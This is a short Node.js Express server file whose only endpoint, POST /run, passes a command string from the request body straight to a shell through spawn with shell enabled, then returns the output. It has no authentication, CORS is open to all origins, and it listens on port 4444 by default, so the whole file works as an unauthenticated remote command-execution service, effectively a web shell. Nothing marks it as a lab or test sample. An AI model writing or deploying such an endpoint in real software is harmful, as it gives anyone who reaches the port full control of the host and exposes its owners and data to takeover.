"use strict";

import express from "express";
import cors from "cors";
import { spawn } from "child_process";

const app = express();

app.use(express.json());
app.use(cors());

app.post("/run", (req, res) => {
  try {
    const command = req.body.cmd.split(" ");

    if (!command || !Array.isArray(command)) {
      return res.status(400).send("Invalid command format.");
    }

    const cmd = command[0];
    const args = command.slice(1);

    const process = spawn(cmd, args, { shell: true });

    let output = "";
    let errorOutput = "";

    process.stdout.on("data", (data) => {
      output += data.toString();
    });

    process.stderr.on("data", (data) => {
      errorOutput += data.toString();
    });

    process.on("close", (code) => {
      if (code !== 0) {
        return res.status(500).send(errorOutput);
      }

      return res.status(200).send(output);
    });

    process.on("error", (err) => {
      return res.status(500).send(err.message);
    });
  } catch (err) {
    return res.status(500).send(err.message);
  }
});

const PORT = process.env.PORT || 4444;
app.listen(PORT);
